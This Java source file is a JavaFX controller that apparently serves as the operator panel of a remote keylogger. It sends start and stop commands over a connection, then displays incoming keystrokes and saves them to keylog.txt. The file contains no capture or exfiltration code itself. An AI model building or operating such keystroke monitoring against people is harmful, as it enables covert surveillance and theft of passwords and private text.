package client;

import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.TextArea;

import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Objects;

public class ClientKeyloggerController {
    public ClientController clientController;

    @FXML
    private TextArea txtLog;

    @FXML
    private Button btnStart;

    public int running = 0;

    public String keylog = "";

    private StringBuilder stringBuilder = new StringBuilder();

    public class KeyloggerThread extends Thread{
        public void run() {
            try {
                while (true)
                {
                    String key = clientController.br.readLine();
                    if (Objects.equals(key, "stop"))
                        break;
                    if (key.length()>0) {
                        keylog = stringBuilder.append(key).append(" ").toString();
                    }
                    txtLog.setText(keylog);
                }

            } catch (IOException e) {
                int a = 0;
            }
        }
    }

    public KeyloggerThread keyloggerThread = new KeyloggerThread();

    public void function() throws IOException, InterruptedException {
        if (running == 0)
            start();
        else
            stop();
    }
    public void start() throws IOException {
        btnStart.setText("Stop");
        running = 1;
        keyloggerThread = new KeyloggerThread();
        keyloggerThread.setDaemon(true);
        keyloggerThread.start();
        clientController.writeData("8");
    }

    public void stop() throws IOException, InterruptedException {
        if (running == 1)
        {
            btnStart.setText("Start");
            running = 0;
            clientController.writeData("9");
            keyloggerThread.interrupt();
        }
    }

    public void delete()
    {
        keylog = "";
        stringBuilder.setLength(0);
        txtLog.setText(keylog);
    }

    public void save() throws IOException {
        FileWriter fileWriter = new FileWriter("keylog.txt");
        PrintWriter out = new PrintWriter(fileWriter);
        out.println(keylog);
        out.close();
    }
}
